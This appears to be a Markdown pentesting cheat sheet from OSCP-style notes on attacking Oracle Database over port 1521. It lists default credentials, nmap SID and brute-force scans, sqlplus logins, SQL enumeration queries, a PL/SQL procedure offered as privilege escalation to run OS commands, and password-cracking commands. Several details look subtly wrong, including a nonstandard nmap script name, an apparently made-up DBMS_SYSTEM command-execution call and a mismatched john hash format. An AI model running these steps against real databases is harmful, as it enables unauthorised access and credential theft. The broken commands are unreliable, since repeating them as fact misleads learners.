# Oracle Database Enumeration (Port 1521)

**Source:** gabb4r/OSCP Notes Integration

## Quick Intro

- Oracle Database default port: 1521
- Enterprise database platform used in organizations
- Vulnerable to default credentials, weak passwords, SQL injection
- Both authenticated and unauthenticated enumeration possible

## Port Scanning & Identification

```bash
nmap -sV -p 1521 <target>
nmap -sV -p 1521 --script=oracle-sid-brute <target>
```

## Default Credentials

Always test these first:
- `oracle:oracle`
- `sys:change_on_install`
- `system:manager`
- `system:oracle`
- `admin:admin`

## Connection Tools

### SQLPlus (if Oracle client installed)

```bash
sqlplus -v <version>
sqlplus <user>/<password>@<IP>:1521/<SID>
sqlplus sys/<password>@<IP>:1521/<SID> as sysdba
```

### TNS Connection String

Test SID discovery:
```bash
tnsping <IP>:1521/<SID>
```

## Enumerate via NMAP

```bash
nmap --script oracle-* -p 1521 <target>
nmap --script oracle-brute-force -p 1521 <target>
nmap --script oracle-enum-users -p 1521 <target>
```

## SID Enumeration

```bash
# Common SIDs: ORCL, XE, DEMO, TEST, PROD
# Use Oracle SID discovery tool or nmap script
```

## Post-Connection Enumeration

Once connected as low-privilege user:

```sql
-- Current user
SELECT USER FROM DUAL;

-- Database version
SELECT * FROM V$VERSION;

-- List users
SELECT USERNAME FROM DBA_USERS;

-- List roles
SELECT DISTINCT ROLE FROM DBA_ROLES;

-- DBA privileges check
SELECT * FROM DBA_SYS_PRIVS WHERE GRANTEE='<USER>';

-- Tablespaces
SELECT TABLESPACE_NAME FROM DBA_TABLESPACES;
```

## Privilege Escalation

```sql
-- Check if user can grant roles
SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTEE='<USER>';

-- Attempt to create table in accessible tablespace
CREATE TABLE <user>.<table> (col1 VARCHAR2(50));

-- Abuse PL/SQL execution privileges
CREATE OR REPLACE PROCEDURE exec_cmd(cmd VARCHAR2) AS
BEGIN
  DBMS_SYSTEM.KEXECRIPC(6,'cmd /c <command>');
END;
/
```

## Password Cracking

Oracle uses DES encryption for passwords:
```bash
hashcat -m 3100 <hash_file> <wordlist>
john --format=odf <hash_file>
```

## Related Notes

- [[03-Enumeration/MySQL-Enumeration]] → MySQL enumeration
- [[03-Enumeration/MsSQL-Enumeration]] → MS SQL Server enumeration
- [[05-Post-Exploitation]] → Post-shell enumeration
